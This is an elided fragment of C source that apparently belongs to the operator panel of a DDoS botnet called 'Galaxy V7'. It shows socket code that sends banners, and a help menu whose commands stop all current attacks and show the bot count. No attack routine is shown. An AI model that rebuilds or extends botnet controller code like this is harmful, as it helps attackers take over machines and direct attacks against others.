...
void *TitleWriter(void *sock) {
  ...
  sprintf(ascii_banner_line12,  "\e[35m     Galaxy V7 - \e[0;32mAll the other versions are shit\r\n");
   ...
   if(send(datafd, ascii_banner_line13, strlen(ascii_banner_line13), MSG_NOSIGNAL) == -1) goto end;
		...
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
			...
			if(strstr(buf, "HELP")) {
				...
				sprintf(hp1,  "\e[37m[---\e[31mThere Is More Commands In This Version but they aint here\e[37m---]\r\n");
				sprintf(hp2,  "\e[32mSTOP         \e[37m| \e[36mKills All Current Attacks\r\n");
				sprintf(hp3,  "\e[32mSTATUS       \e[37m| \e[36mShows The Current Botcount\r\n");
